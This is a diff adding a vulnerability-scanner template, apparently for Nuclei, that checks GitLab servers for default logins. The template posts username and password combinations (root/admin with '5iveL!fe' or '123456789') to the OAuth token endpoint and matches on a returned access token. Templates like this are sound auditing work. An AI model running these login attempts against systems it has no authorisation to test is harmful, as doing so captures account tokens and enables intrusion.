@@ -1,0 +1,42 @@
+id: gitlab-weak-login
+
+info:
+  name: Gitlab Default Login
+  author: Suman_Kar,dwisiswant0
+  severity: high
+  tags: gitlab,default-login
+
+requests:
+  - raw:
+      - |
+        POST /oauth/token HTTP/1.1
+        Host: {{Hostname}}
+        Accept: application/json, text/plain, */*
+        Referer: {{BaseURL}}
+        content-type: application/json
+
+        {"grant_type":"password","username":"{{username}}","password":"{{password}}"}
+    attack: clusterbomb
+    payloads:
+      username:
+        - "root"
+        - "admin"
+        - "admin@local.host"
+
+      password:
+        - "5iveL!fe"
+        - "123456789"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: body
+        words:
+          - '"access_token":'
+          - '"token_type":'
+          - '"refresh_token":'
+        condition: and
